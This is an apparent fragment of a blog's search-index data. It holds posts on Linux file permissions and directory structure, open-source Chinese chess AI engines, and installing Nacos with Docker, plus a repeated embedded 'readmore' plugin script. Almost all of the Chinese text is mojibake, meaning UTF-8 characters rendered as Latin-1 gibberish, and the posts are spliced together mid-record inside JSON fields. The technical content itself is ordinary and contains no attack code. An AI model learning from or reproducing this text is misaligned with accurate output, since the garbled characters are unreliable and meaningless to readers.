åªå…è®¸ç”¨æˆ·è‡ªå·±è®¿é—®ï¼ˆæ‰€æœ‰è€…ï¼‰ï¼šæ‰€æœ‰è€…å°±æ˜¯åˆ›å»ºæ–‡ä»¶çš„ç”¨æˆ·ï¼Œç”¨æˆ·æ˜¯æ‰€æœ‰ç”¨æˆ·æ‰€åˆ›å»ºæ–‡ä»¶çš„æ‰€æœ‰è€…ï¼Œç”¨æˆ·å¯ä»¥å…è®¸æ‰€åœ¨çš„ç”¨æˆ·ç»„èƒ½è®¿é—®ç”¨æˆ·çš„æ–‡ä»¶ å…è®¸ä¸€ä¸ªé¢„å…ˆæŒ‡å®šçš„ç”¨æˆ·ç»„ä¸­çš„ç”¨æˆ·è®¿é—®ï¼šç”¨æˆ·ç»„ç”±ä¸åŒçš„ç”¨æˆ·ç»„æˆï¼Œä¾‹å¦‚ï¼ŒæŸä¸€ç±»æˆ–æŸä¸€é¡¹ç›®ä¸­çš„æ‰€æœ‰ç”¨æˆ·éƒ½èƒ½å¤Ÿè¢«ç³»ç»Ÿç®¡ç†å‘˜å½’ä¸ºä¸€ä¸ªç”¨æˆ·ç»„ï¼Œä¸€ä¸ªç”¨æˆ·èƒ½å¤Ÿæˆäºˆæ‰€åœ¨ç”¨æˆ·ç»„çš„å…¶ä»–æˆå‘˜çš„æ–‡ä»¶è®¿é—®æƒé™ å…è®¸ç³»ç»Ÿä¸­çš„ä»»ä½•ç”¨æˆ·è®¿é—®ï¼ˆå…¶ä»–ç”¨æˆ·ï¼‰ï¼šç”¨æˆ·ä¹Ÿå¯ä»¥å°†è‡ªå·±çš„æ–‡ä»¶å‘ç³»ç»Ÿå†…çš„æ‰€æœ‰ç”¨æˆ·å¼€æ”¾ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç³»ç»Ÿå†…çš„æ‰€æœ‰ç”¨æˆ·éƒ½èƒ½å¤Ÿè®¿é—®ç”¨æˆ·çš„ç›®å½•æˆ–æ–‡ä»¶ã€‚åœ¨è¿™ç§æ„ä¹‰ä¸Šï¼Œç³»ç»Ÿå†…çš„å…¶ä»–æ‰€æœ‰ç”¨æˆ·å°±æ˜¯ other ç”¨æˆ·ç±» è®¿é—®æƒé™ç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶ä¸€ä¸ªç»™å®šçš„æ–‡ä»¶æˆ–ç›®å½•çš„è®¿é—®æƒé™ï¼Œä¸€ä¸ªæ–‡ä»¶æˆ–ç›®å½•å¯èƒ½æœ‰è¯»ã€å†™åŠæ‰§è¡Œæƒé™ï¼š è¯»æƒé™ï¼ˆrï¼‰ï¼šå¯¹æ–‡ä»¶è€Œè¨€ï¼Œå…·æœ‰è¯»å–æ–‡ä»¶å†…å®¹çš„æƒé™ï¼›å¯¹ç›®å½•æ¥è¯´ï¼Œå…·æœ‰æµè§ˆç›®å½•çš„æƒé™ å†™æƒé™ï¼ˆwï¼‰ï¼šå¯¹æ–‡ä»¶è€Œè¨€ï¼Œå…·æœ‰æ–°å¢ã€ä¿®æ”¹ã€åˆ é™¤æ–‡ä»¶å†…å®¹çš„æƒé™ï¼›å¯¹ç›®å½•æ¥è¯´ï¼Œå…·æœ‰åˆ›å»ºã€åˆ é™¤ã€ç§»åŠ¨ç›®å½•å†…æ–‡ä»¶çš„æƒé™ å¯æ‰§è¡Œæƒé™ï¼ˆxï¼‰ï¼šå¯¹æ–‡ä»¶è€Œè¨€ï¼Œå…·æœ‰æ‰§è¡Œæ–‡ä»¶çš„æƒé™ï¼›å¯¹ç›®å½•æ¥è¯´ï¼Œè¯¥ç”¨æˆ·å…·æœ‰è¿›å…¥ç›®å½•çš„æƒé™ a) ç¬¬ 1 ä¸ªå­—æ¯ä»£è¡¨æ–‡ä»¶çš„ç±»å‹ï¼šd ä»£è¡¨æ–‡ä»¶å¤¹ã€- ä»£è¡¨æ™®é€šæ–‡ä»¶ã€c ä»£è¡¨ç¡¬ä»¶å­—ç¬¦è®¾å¤‡ã€b ä»£è¡¨ç¡¬ä»¶å—è®¾å¤‡ã€s è¡¨ç¤ºç®¡é“æ–‡ä»¶ã€l ä»£è¡¨è½¯é“¾æ¥æ–‡ä»¶ b) å 9 ä¸ªå­—æ¯ä¾æ¬¡ä»£è¡¨ä¸‰ç»„æƒé™ï¼šæ–‡ä»¶æ‰€æœ‰è€…ã€ç”¨æˆ·ç»„ã€å…¶ä»–ç”¨æˆ·æ‹¥æœ‰çš„æƒé™ ç¬¬ä¸€ç»„æƒé™æ§åˆ¶è®¿é—®è‡ªå·±çš„æ–‡ä»¶æƒé™ï¼Œå³æ‰€æœ‰è€…æƒé™ ç¬¬äºŒç»„æƒé™æ§åˆ¶ç”¨æˆ·ç»„å…¶ä¸­ä¸€ä¸ªç”¨æˆ·è®¿é—®æ–‡ä»¶çš„æƒé™ ç¬¬ä¸‰ç»„æƒé™æ§åˆ¶å…¶ä»–æ‰€æœ‰ç”¨æˆ·è®¿é—®æ–‡ä»¶çš„æƒé™ c) è¿™ä¸‰ç»„æƒé™èµ‹äºˆç”¨æˆ·ä¸åŒç±»å‹ï¼ˆå³æ‰€æœ‰è€…ã€ç”¨æˆ·ç»„å’Œå…¶ä»–ç”¨æˆ·ï¼‰çš„è¯»ã€å†™åŠæ‰§è¡Œæƒé™ï¼Œè¿™å°±æ„æˆäº†ä¸€å…±æœ‰ 9 ç§ç±»å‹çš„æƒé™ç»„ Linux ç›®å½•ç»“æ„è¯´æ˜ /ï¼šæ ¹ç›®å½•ï¼Œä¸€èˆ¬æ ¹ç›®å½•ä¸‹åªå­˜æ”¾ç›®å½•ï¼Œåœ¨ Linux ä¸‹æœ‰ä¸”åªæœ‰ä¸€ä¸ªæ ¹ç›®å½•ï¼Œæ‰€æœ‰çš„ä¸œè¥¿éƒ½æ˜¯ä»è¿™é‡Œå¼€å§‹ã€‚å½“åœ¨ç»ˆç«¯é‡Œè¾“å…¥ /homeï¼Œå…¶å®æ˜¯åœ¨å‘Šè¯‰ç³»ç»Ÿï¼Œå…ˆä» /ï¼ˆæ ¹ç›®å½•ï¼‰ å¼€å§‹ï¼Œå†è¿›å…¥åˆ° home ç›®å½• /binã€/usr/bin: å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶çš„ç›®å½•ï¼Œå¦‚å¸¸ç”¨çš„å‘½ä»¤ lsã€tarã€mvã€cat ç­‰ /bootï¼šæ”¾ç½® Linux ç³»ç»Ÿå¯åŠ¨æ—¶ç”¨åˆ°çš„ä¸€äº›æ–‡ä»¶ï¼Œå¦‚ Linux çš„å†…æ ¸æ–‡ä»¶ï¼š/boot/vmlinuzï¼Œç³»ç»Ÿå¼•å¯¼ç®¡ç†å™¨ï¼š/boot/grub /devï¼šå­˜æ”¾ Linux ç³»ç»Ÿä¸‹çš„è®¾å¤‡æ–‡ä»¶ï¼Œè®¿é—®è¯¥ç›®å½•ä¸‹æŸä¸ªæ–‡ä»¶ï¼Œç›¸å½“äºè®¿é—®æŸä¸ªè®¾å¤‡ï¼Œå¸¸ç”¨çš„æ˜¯æŒ‚è½½å…‰é©±å‘½ä»¤ mount /dev/cdrom /mnt /etcï¼šç³»ç»Ÿé…ç½®æ–‡ä»¶å­˜æ”¾çš„ç›®å½•ï¼Œä¸å»ºè®®åœ¨æ­¤ç›®å½•ä¸‹å­˜æ”¾å¯æ‰§è¡Œæ–‡ä»¶ï¼Œé‡è¦çš„é…ç½®æ–‡ä»¶æœ‰ /etc/inittabã€/etc/fstabã€/etc/init.dã€/etc/X11ã€/etc/sysconfigã€/etc/xinetd.d /homeï¼šç³»ç»Ÿé»˜è®¤çš„ç”¨æˆ·å®¶ç›®å½•ï¼Œæ–°å¢ç”¨æˆ·è´¦å·æ—¶ï¼Œç”¨æˆ·çš„å®¶ç›®å½•éƒ½å­˜æ”¾åœ¨æ­¤ç›®å½•ä¸‹ï¼Œ~ è¡¨ç¤ºå½“å‰ç”¨æˆ·çš„å®¶ç›®å½•ï¼Œ~edu è¡¨ç¤ºç”¨æˆ· edu çš„å®¶ç›®å½• /libã€/usr/libã€/usr/local/libï¼šç³»ç»Ÿä½¿ç”¨çš„å‡½æ•°åº“çš„ç›®å½•ï¼Œç¨‹åºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œéœ€è¦è°ƒç”¨ä¸€äº›é¢å¤–çš„å‚æ•°æ—¶éœ€è¦å‡½æ•°åº“çš„ååŠ© /lost+fountï¼šç³»ç»Ÿå¼‚å¸¸äº§ç”Ÿé”™è¯¯æ—¶ï¼Œä¼šå°†ä¸€äº›é—å¤±çš„ç‰‡æ®µæ”¾ç½®äºæ­¤ç›®å½•ä¸‹ /mntã€/mediaï¼šå…‰ç›˜é»˜è®¤æŒ‚è½½ç‚¹ï¼Œé€šå¸¸å…‰ç›˜æŒ‚è½½äº /mnt/cdrom ä¸‹ï¼Œä½†ä¹Ÿä¸ä¸€å®šï¼Œå¯ä»¥é€‰æ‹©ä»»æ„ä½ç½®è¿›è¡ŒæŒ‚è½½ /optï¼šç»™ä¸»æœºé¢å¤–å®‰è£…è½¯ä»¶æ‰€æ‘†æ”¾çš„ç›®å½• /procï¼šæ­¤ç›®å½•çš„æ•°æ®éƒ½åœ¨å†…å­˜ä¸­ï¼Œå¦‚ç³»ç»Ÿæ ¸å¿ƒï¼Œå¤–éƒ¨è®¾å¤‡ï¼Œç½‘ç»œçŠ¶æ€ï¼Œç”±äºæ•°æ®éƒ½å­˜æ”¾äºå†…å­˜ä¸­ï¼Œæ‰€ä»¥ä¸å ç”¨ç£ç›˜ç©ºé—´ï¼Œæ¯”è¾ƒé‡è¦çš„ç›®å½•æœ‰ /proc/cpuinfoã€/proc/interruptsã€/proc/dmaã€/proc/ioportsã€/proc/net/* /rootï¼šç³»ç»Ÿç®¡ç†å‘˜ root çš„å®¶ç›®å½• /sbinã€/usr/sbinã€/usr/local/sbinï¼šæ”¾ç½®ç³»ç»Ÿç®¡ç†å‘˜ä½¿ç”¨çš„å¯æ‰§è¡Œå‘½ä»¤ï¼Œå¦‚ fdiskã€shutdownã€mount ç­‰ã€‚ä¸ /bin ä¸åŒçš„æ˜¯ï¼Œè¿™å‡ ä¸ªç›®å½•æ˜¯ç»™ç³»ç»Ÿç®¡ç†å‘˜ root ä½¿ç”¨çš„å‘½ä»¤ï¼Œä¸€èˆ¬ç”¨æˆ·åªèƒ½æŸ¥çœ‹è€Œä¸èƒ½è®¾ç½®å’Œä½¿ç”¨ /tmp ä¸€èˆ¬ç”¨æˆ·æˆ–æ­£åœ¨æ‰§è¡Œçš„ç¨‹åºä¸´æ—¶å­˜æ”¾æ–‡ä»¶çš„ç›®å½•ï¼Œä»»ä½•äººéƒ½å¯ä»¥è®¿é—®ï¼Œé‡è¦æ•°æ®ä¸å¯æ”¾ç½®åœ¨æ­¤ç›®å½•ä¸‹ /srvï¼šæœåŠ¡å¯åŠ¨ä¹‹åéœ€è¦è®¿é—®çš„æ•°æ®ç›®å½•ï¼Œå¦‚ç½‘é¡µæœåŠ¡éœ€è¦è®¿é—®çš„ç½‘é¡µæ•°æ®å­˜æ”¾åœ¨ /srv/www å†… /usrï¼šåº”ç”¨ç¨‹åºå­˜æ”¾çš„ç›®å½•ï¼Œä¾‹å¦‚ /usr/bin å­˜æ”¾åº”ç”¨ç¨‹åºï¼Œ/usr/share å­˜æ”¾å…±äº«æ•°æ®ï¼Œ/usr/lib å­˜æ”¾ä¸èƒ½ç›´æ¥è¿è¡Œçš„ï¼Œå´æ˜¯è®¸å¤šç¨‹åºè¿è¡Œæ‰€å¿…éœ€çš„ä¸€äº›å‡½æ•°åº“æ–‡ä»¶ï¼Œ/usr/local å­˜æ”¾è½¯ä»¶å‡çº§åŒ…ï¼Œ/usr/share/doc ç³»ç»Ÿè¯´æ˜æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼Œ/usr/share/man ç¨‹åºè¯´æ˜æ–‡ä»¶å­˜æ”¾ç›®å½• /varï¼šæ”¾ç½®ç³»ç»Ÿæ‰§è¡Œè¿‡ç¨‹ä¸­ç»å¸¸å˜åŒ–çš„æ–‡ä»¶ï¼Œä¾‹å¦‚ /var/logï¼šå­˜æ”¾éšæ—¶æ›´æ”¹çš„æ—¥å¿—æ–‡ä»¶ï¼Œ/var/spool/mailï¼šå­˜æ”¾é‚®ä»¶çš„ç›®å½•ï¼Œ/var/runï¼šç¨‹åºæˆ–æœåŠ¡å¯åŠ¨åï¼Œå…¶ PID å­˜æ”¾çš„ç›®å½• Windows å’Œ Linux æ–‡ä»¶ç³»ç»Ÿåœ¨ Windows å¹³å°ä¸‹ï¼Œæ‰“å¼€ è®¡ç®—æœº ç•Œé¢ï¼Œå¯ä»¥çœ‹åˆ°çš„æ˜¯ä¸€ä¸ªä¸ªçš„é©±åŠ¨å™¨ç›˜ç¬¦ï¼Œè€Œæ¯ä¸ªé©±åŠ¨å™¨éƒ½æœ‰è‡ªå·±çš„æ ¹ç›®å½•ç»“æ„ï¼Œè¿™æ ·å½¢æˆäº†å¤šé¢—æ ‘å¹¶åˆ—çš„æƒ…å½¢ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š åœ¨ Linux ä¸‹ï¼Œæ˜¯çœ‹ä¸åˆ°è¿™äº›é©±åŠ¨å™¨ç›˜ç¬¦ï¼Œçœ‹åˆ°çš„åªæœ‰æ–‡ä»¶å¤¹ï¼ˆç›®å½•ï¼‰ã€‚åœ¨æ—©æœŸçš„ UNIX ç³»ç»Ÿä¸­ï¼Œå„ä¸ªå‚å®¶å„è‡ªå®šä¹‰äº†è‡ªå·±çš„ UNIX ç³»ç»Ÿæ–‡ä»¶ç›®å½•ï¼Œæ¯”è¾ƒæ··ä¹±ã€‚Linux é¢ä¸–ä¸ä¹…åï¼Œå¯¹æ–‡ä»¶ç›®å½•è¿›è¡Œäº†æ ‡å‡†åŒ–ï¼Œäº 1994 å¹´å¯¹æ ¹æ–‡ä»¶ç›®å½•åšäº†ç»Ÿä¸€çš„è§„èŒƒï¼Œæ¨å‡º FHSï¼ˆFilesystem Hierarchy Standardï¼‰çš„ Linux æ–‡ä»¶ç³»ç»Ÿå±‚æ¬¡ç»“æ„æ ‡å‡†ã€‚FHS æ ‡å‡†è§„å®šäº† Linux æ ¹ç›®å½•å„æ–‡ä»¶å¤¹çš„åç§°åŠä½œç”¨ï¼Œç»Ÿä¸€äº† Linux ç•Œå‘½åæ··ä¹±çš„å±€é¢ã€‚å’Œ Windows æ“ä½œç³»ç»Ÿç±»ä¼¼ï¼Œæ‰€æœ‰ Unix/Linux çš„æ•°æ®éƒ½æ˜¯ç”±æ–‡ä»¶ç³»ç»ŸæŒ‰ç…§æ ‘å‹ç›®å½•ç»“æ„ç®¡ç†çš„ï¼Œè€Œä¸” Unix/Linux æ“ä½œç³»ç»ŸåŒæ ·è¦åŒºåˆ†æ–‡ä»¶çš„ç±»å‹ï¼Œåˆ¤æ–­æ–‡ä»¶çš„å­˜å–å±æ€§å’Œå¯æ‰§è¡Œå±æ€§ã€‚ä½† Unix/Linux æ–‡ä»¶ç³»ç»Ÿä¸ä½¿ç”¨é©±åŠ¨å™¨è¿™ä¸ªæ¦‚å¿µï¼Œè€Œæ˜¯ä½¿ç”¨å•ä¸€çš„æ ¹ç›®å½•ç»“æ„ï¼Œæ‰€æœ‰çš„åˆ†åŒºéƒ½æŒ‚è½½åˆ°å•ä¸€çš„ / ç›®å½•ä¸Šï¼Œå…¶ç»“æ„ç¤ºæ„å›¾å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linuxç³»ç»Ÿç¼–ç¨‹"},{title:"ä¸­å›½è±¡æ£‹ä¹‹äºŒå¼€æº AI å¼•æ“ä»‹ç»",url:"/posts/26ffa5e3.html",text:'ä¸Šç¯‡ ä¸­å›½è±¡æ£‹ä¹‹ä¸€ Linux ä¸‹çš„è±¡æ£‹è½¯ä»¶ GMChess å‰è¨€æœ¬æ–‡å°†ä»‹ç»é’ˆå¯¹ä¸­å›½è±¡æ£‹çš„å¼€æº AI å¼•æ“ï¼Œæ—¨åœ¨å¯¹å¸Œæœ›æ‰“é€ è‡ªå·±çš„ä¸­å›½è±¡æ£‹å¼•æ“çš„å¼€å‘è€…æä¾›ä¸€ç‚¹å¸®åŠ©ã€‚ç›®å‰ä¸­å›½è±¡æ£‹ AI å¼•æ“ä¸»è¦åˆ†ä¸ºä¸¤ç±»ï¼Œç¬¬ä¸€ç±»æ˜¯ä¼ ç»Ÿçš„è±¡æ£‹ AI å¼•æ“ï¼ˆå¦‚è±¡æ£‹åæ‰‹ã€è±¡æ£‹æ—‹é£ï¼‰ï¼Œå±äº CPU å¯†é›†è®¡ç®—å‹çš„å¼•æ“ï¼›ç¬¬äºŒç±»åˆ™æ˜¯åŸºäº Alpha-Zero æ·±åº¦å¼ºåŒ–å­¦ä¹ ç®—æ³•çš„æ–°å…´ AI å¼•æ“ï¼Œå±äº GPU å¯†é›†è®¡ç®—å‹çš„å¼•æ“ã€‚ç”±äºè°·æ­Œçš„ DeepMind Alpha-Zero å·²ç» â€œé€šæ€â€ å›´æ£‹ã€å›½é™…è±¡æ£‹ã€æ—¥æœ¬å°†æ£‹ï¼Œå› æ­¤ç¬¬äºŒç±»ä¸­å›½è±¡æ£‹ AI å¼•æ“éå¸¸å€¼å¾—å…³æ³¨ã€‚ å¼€æºè±¡æ£‹å¼•æ“HarmlessHarmless æ˜¯ä¸€æ¬¾ Linux ä¸‹çš„ä¸­å›½è±¡æ£‹å¼•æ“ï¼Œåœ¨æ™®é€šæœºå™¨ä¸Šé™å®šæ¯æ­¥ 6 ç§’æ—¶é—´çš„æƒ…å†µä¸‹ï¼Œå¹³å‡æœç´¢æ·±åº¦åœ¨ 5-8 å±‚å·¦å³ã€‚æ ¸å¿ƒæœç´¢ä¸»è¦é‡‡ç”¨çš„æ˜¯æå°çª—å£æœç´¢ï¼Œå¹¶ç»“åˆäº†å“ˆå¸Œè¡¨æŠ€æœ¯å’Œå†å²å¯å‘ï¼›è¯„ä¼°å‡½æ•°åˆ™ç›¸å¯¹å®ç°å¾—æ¯”è¾ƒç®€å•ï¼Œåªè€ƒè™‘äº†æ£‹å­æœ¬èº«çš„ä»·å€¼å’Œæ£‹å­é—´çš„çµæ´»åº¦ï¼Œè™½ä¸é è°±ï¼Œä½†åŸºæœ¬èƒ½ç”¨ã€‚å¼•æ“éƒ¨åˆ†å®Œå…¨ç”¨ C è¯­è¨€å®ç°ï¼Œæ”¯æŒéƒ¨åˆ† UCCI é€šä¿¡åè®®ï¼Œå¹¶é™„å¸¦äº†ä¸€ä¸ªç®€å•çš„å›¾å½¢ç•Œé¢ï¼Œè¿è¡Œç¯å¢ƒä¾èµ– Python-2.7.x ä¸ Pygame-1.9.xã€‚é™„ä¸ŠåŸä½œè€…å¯¹è¯¥é¡¹ç›®çš„åšå®¢åˆ†äº«ï¼šå†™äº†ä¸€ä¸ª Linux ä¸‹çš„ä¸­å›½è±¡æ£‹å¼•æ“ã€‚ UCCI-ChessEnginesUCCI-ChessEngines æ˜¯ä¸­å›½è±¡æ£‹ UCCI å¼•æ“æºç çš„æ•´ç†ï¼Œå¼•æ“åŒ…æ‹¬ ElephantEyeï¼ˆè±¡çœ¼ï¼‰ã€ BitStrongerã€Eleeyeã€Marsã€æ¢¦å…¥ç¥è›‹ MRSD2ï¼ˆæµ…çº¢å¼•æ“ï¼‰ ChineseChess-EnginesChineseChess-Engines æ˜¯åŸºäº UCCI-ChessEngines é¡¹ç›®ï¼Œæ•´ç†äº†ä¸­å›½è±¡æ£‹ UCCI å¼•æ“çš„æºç ï¼Œåœ¨åŸåŸºç¡€ä¸Šåšäº†å¤§é‡ä¿®æ”¹ï¼Œä½¿å…¶æ”¯æŒåœ¨ Linux ä¸Šè¿è¡Œï¼Œä¿®æ”¹å†…å®¹å¦‚ä¸‹ï¼š å¢åŠ äº† Harmless è±¡æ£‹å¼•æ“ï¼ŒUbuntu ç¼–è¯‘é€šè¿‡ï¼Œæ”¯æŒ UCCI BitStrongerï¼šå¢åŠ äº† makefile, Ubuntu ç¼–è¯‘é€šè¿‡ï¼Œæ”¯æŒ UCCI ElephantEyeï¼ˆè±¡çœ¼ï¼‰ï¼šå¢åŠ äº† makefile, Ubuntu ç¼–è¯‘é€šè¿‡ï¼Œæ”¯æŒ UCCI Marsï¼šä¿®æ”¹äº†ç›¸å…³ä»£ç ï¼Œæ›´æ”¹äº†ç¼–ç æ–¹å¼ä¸º UTF-8ï¼Œå¢åŠ äº† makefileï¼ŒUbuntu ç¼–è¯‘é€šè¿‡ï¼Œæ”¯æŒ UCCI æ¢¦å…¥ç¥è›‹ MRSD2ï¼ˆæµ…çº¢å¼•æ“ï¼‰ï¼šä¿®æ”¹äº†ç›¸å…³ä»£ç ï¼Œæ›´æ”¹äº†ç¼–ç æ–¹å¼ä¸º UTF-8ï¼Œä¿®æ”¹äº† makefileï¼ŒUbuntu ç¼–è¯‘é€šè¿‡ï¼Œä¸æ”¯æŒ UCCI cchess-zerocchess-zero æ˜¯åŸºäº Alpha-Zero çš„å®è·µé¡¹ç›®ï¼Œå®ç°äº†ä¸€ä¸ªä¸­å›½è±¡æ£‹ç¨‹åºï¼Œä½¿ç”¨ TensorFlow1.0 å’Œ Python3.5 å¼€å‘ã€‚é™„ä¸ŠåŸä½œè€…å¯¹è¯¥é¡¹ç›®çš„åšå®¢åˆ†äº«ï¼šAlpha-Zero å®è·µ â€” ä¸­å›½è±¡æ£‹ï¼ˆé™„è®ºæ–‡ç¿»è¯‘ï¼‰ã€‚ icyChessZeroicyChessZero å—åˆ° Alpha-Zero çš„å¯å‘ï¼Œæ—¨åœ¨è®­ç»ƒä¸€ä¸ªä¸­ç­‰äººç±»æ°´å¹³æˆ–é«˜äºä¸­ç­‰äººç±»æ°´å¹³çš„æ·±åº¦ç¥ç»ç½‘ç»œï¼Œæ¥å®Œæˆä¸‹ä¸­å›½è±¡æ£‹çš„ä»»åŠ¡ã€‚ç›®å‰è¯¥é¡¹ç›®ä»ç„¶æ²¡æœ‰å®Œæˆå…¨éƒ¨çš„å¼€å‘ï¼Œå¤„äºåœæ»çŠ¶æ€ã€‚é™„ä¸ŠåŸä½œè€…å¯¹è¯¥é¡¹ç›®çš„åšå®¢åˆ†äº«ï¼šä¸€ä¸ªåˆ†å¸ƒå¼ä¸­å›½è±¡æ£‹ Alpha Zeroã€‚ CCZeroCCZero çš„ç›®æ ‡æ˜¯å°† Alpha-Zero çš„ç®—æ³•åº”ç”¨åˆ°äº†ä¸­å›½è±¡æ£‹ä¸Šï¼Œæ—¨åœ¨å€ŸåŠ©å¹¿å¤§è±¡æ£‹çˆ±å¥½è€…ä¹‹åŠ›ä¸€èµ·è®­ç»ƒå‡ºä¸€ä¸ªå¯ä»¥æ‰“è´¥æ—‹é£åæ‰‹çš„ â€œè±¡æ£‹ä¹‹ç¥â€ã€‚å› ä¸ºç§ç§åŸå› ï¼Œè¿™ä¸ªç›®æ ‡æˆªæ­¢ 2018/11/07 ä¸ºæ­¢ä»æœªèƒ½å®ç°ï¼Œæˆ–è€…è¯´è¿˜å·®å¾—è¿œï¼Œè€Œä¸”è·‘è°±çš„äººä¹Ÿè¶Šæ¥è¶Šå°‘äº†ï¼Œä½œè€…å·²ç»æ”¾å¼ƒè¯¥é¡¹ç›®ã€‚é™„ä¸ŠåŸä½œè€…å¯¹è¯¥é¡¹ç›®çš„åšå®¢åˆ†äº«ï¼šä¸­å›½è±¡æ£‹ Zero æŠ€æœ¯è¯¦è§£ã€‚ GGzeroGGzero é‡‡ç”¨äº†è°·æ­Œ DeepMind å…¬å¸æå‡ºçš„ Alpha-Zero æ·±åº¦å¼ºåŒ–å­¦ä¹ ç®—æ³•ï¼ŒåŸºäºå›½é™…è±¡æ£‹å¼•æ“ leela-chess è¿›è¡Œå¼€å‘ï¼Œæ˜¯ç›®å‰ä¸–ç•Œä¸Šé¦–æ¬¾è¾¾åˆ°å•†ä¸šå¼•æ“æ°´å¹³çš„æ˜¾å¡åŠ é€Ÿè±¡æ£‹å¼•æ“ã€‚GGzero é¡¹ç›®æ˜¯ä¸€ä¸ªå›¢é˜Ÿåœ¨ç»´æŠ¤ï¼Œåˆ›ä½œè€…æ˜¯ä½³ä½³è±¡æ£‹çš„ä½œè€…æå›½æ¥ï¼›ç›®å‰å°± Elo åˆ†æ¥è¯´æ˜¯æœ€å¼ºçš„ï¼Œä½†å‘å±•çŠ¶å†µé€æ¸å‘ˆç°å•†ä¸šåŒ–è¶‹åŠ¿ï¼ˆä½œè€…æ²¡æœ‰å…¬å¼€å‘å¸ƒæœ€æ–°çš„ä»£ç ï¼‰ï¼Œæ›´å¤šèµ„æ–™å¯åœ¨ç¤¾åŒºè®ºå›ä¸Šè·å–ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒGGzero æ›¾è·å¾—ç¬¬ä¸‰å±Šæ¥šæ²³æ±‰ç•Œè±¡æ£‹äººå·¥æ™ºèƒ½å¤§èµ›ç¬¬ä¸‰åï¼Œ2019 å¹´åŒ—äº¬äººå·¥æ™ºèƒ½å¤§èµ›å¹¶åˆ—ç¬¬äºŒåï¼Œæ¯”èµ›è§„åˆ™ä¸æœºå™¨é…ç½®å¦‚ä¸‹ï¼š èµ›åˆ¶ç”¨æ—¶ï¼š10 åˆ†é’Ÿ + 3 ç§’ å…¶å®ƒå•†ä¸šå¼•æ“çš„æœºå™¨é…ç½®ï¼šXeon 2696 V4ï¼ˆ44 æ ¸å¿ƒï¼‰ï¼Œæœ‰å¼€å±€åº“ï¼Œæœ‰æ®‹å±€åº“ GGzero çš„æœºå™¨é…ç½®ï¼šNvidia GeForce RTX 2070 Super X 4ï¼Œæ— å¼€å±€åº“ï¼Œæ— æ®‹å±€åº“ ä¸­å›½è±¡æ£‹å¼•æ“æ’è¡Œæ¦œ ç¬¬ä¸€é˜µè¥ï¼šè±¡æ£‹åæ‰‹ã€è±¡æ£‹æ—‹é£ ç¬¬äºŒé˜µè¥ï¼šå°è™«è±¡æ£‹ã€å¤©æœºè±¡æ£‹ã€Alpha çŒ«ã€ä½³ä½³è±¡æ£‹ã€å—å¥¥è±¡æ£‹ ç¬¬ä¸‰é˜µè¥ï¼šUFXã€è±¡æ£‹å¤©å¯ å…¶ä»–æ£‹ç±»çš„å¼€æº AI å¼•æ“ å›´æ£‹ï¼ˆleela-zeroï¼‰ é»‘ç™½æ£‹ï¼ˆreversi-alpha-zeroï¼‰ å›½é™…è±¡æ£‹ï¼ˆchess-alpha-zeroï¼‰ äº”å­æ£‹ï¼ˆAlphaZero-Gomokuï¼‰ å‚è€ƒèµ„æ–™ è±¡æ£‹ç™¾ç§‘ ä¸­å›½è±¡æ£‹ AI å®ç° 28 å¤©è‡ªåˆ¶ä½ çš„ AlphaGoï¼ˆ3ï¼‰ï¼šè®­ç»ƒç­–ç•¥ç½‘ç»œï¼ŒçœŸæ­£ä¸ä¹‹å¯¹å¼ˆ ä¸‹ç¯‡ ä¸­å›½è±¡æ£‹ä¹‹ä¸‰ ElephantEye å¼•æ“æ·±å…¥ç†è§£ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€æº"},{title:"Docker å®‰è£… Nacos å•æœºå’Œé›†ç¾¤",url:"/posts/961beae9.html",text:'å‰è¨€æœ¬æ–‡ä¸»è¦ä»‹ç»å¦‚ä½•ä½¿ç”¨ Docker å®‰è£…å¹¶ç®¡ç† Nacos çš„é•œåƒå’Œå®¹å™¨ï¼Œæ¶‰åŠåˆ° Nacos å•æœºç‰ˆä¸é›†ç¾¤ç‰ˆçš„å®‰è£…ï¼Œå¹¶è¿æ¥ä¸Š MySQL æ•°æ®åº“ï¼ŒåŒæ—¶è¿˜ä¼šä»‹ç» Prometheus ä¸ Grafana ç›‘æ§ç³»ç»Ÿçš„ä½¿ç”¨ã€‚ 1.0ã€è½¯ä»¶ç¯å¢ƒ CentOS 7.9 Docker 20.10.1 Docker-Compose 1.24.0-rc1 Nacos 1.4.0ï¼ˆæˆªæ­¢ç›®å‰æœ€æ–°çš„ç‰ˆæœ¬ï¼‰ 1.1ã€å¿«é€Ÿå¯åŠ¨å•æœºæ¨¡å¼å¿«é€Ÿå¯åŠ¨ Nacosï¼Œä½¿ç”¨åµŒå…¥å¼æ•°æ®åº“ 1# docker run --name nacos-standalone-embedded -e MODE=standalone -p 8848:8848 -d nacos/nacos-server:latest 